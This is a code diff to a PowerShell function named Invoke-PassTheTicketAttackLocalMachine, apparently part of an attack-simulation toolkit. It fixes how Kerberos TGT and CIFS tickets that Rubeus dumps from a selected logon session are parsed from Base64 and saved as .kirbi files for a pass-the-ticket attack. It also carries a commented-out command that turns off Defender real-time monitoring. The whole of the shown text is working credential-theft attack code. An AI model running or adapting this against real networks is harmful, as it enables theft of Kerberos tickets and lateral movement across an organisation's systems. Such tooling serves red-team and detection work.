@@ -171,14 +171,18 @@ function Invoke-PassTheTicketAttackLocalMachine {
     If (-not $SkipClearHost) { Clear-Host }
 
     #Set-MpPreference -DisableRealtimeMonitoring $true
+    # dump output also contains a "Base64(key)" field ahead of "Base64EncodedTicket" that is
+    # itself 100+ base64 characters long, so the extraction below must anchor on the
+    # "Base64EncodedTicket" label rather than matching the first long base64 run in the text.
+    $ticketPattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
     Try {
         # dump prints Base64 only; /outfile is not a valid dump switch, so each
         # ticket type is dumped with /nowrap and decoded into a .kirbi file here.
         $tgtBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap 2>&1 | Out-String)
         $cifsBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:cifs /nowrap 2>&1 | Out-String)
 
-        $tgtBlob = [regex]::Match($tgtBase64, '[A-Za-z0-9+/=]{100,}').Value
-        $cifsBlob = [regex]::Match($cifsBase64, '[A-Za-z0-9+/=]{100,}').Value
+        $tgtBlob = [regex]::Match($tgtBase64, $ticketPattern).Groups[1].Value
+        $cifsBlob = [regex]::Match($cifsBase64, $ticketPattern).Groups[1].Value
 
         If ($tgtBlob) {
             [IO.File]::WriteAllBytes("$TicketsToAbusePath\$candidate-tgt.kirbi", [Convert]::FromBase64String($tgtBlob))
@@ -186,6 +190,9 @@ function Invoke-PassTheTicketAttackLocalMachine {
         If ($cifsBlob) {
             [IO.File]::WriteAllBytes("$TicketsToAbusePath\$candidate-cifs.kirbi", [Convert]::FromBase64String($cifsBlob))
         }
+    }
+    Catch {
+        Write-AS2GoOutput -Type Warning -Message "Failed to decode or write a dumped ticket for candidate '$candidate': $_"
     }
     Finally {
         #Set-MpPreference -DisableRealtimeMonitoring $false
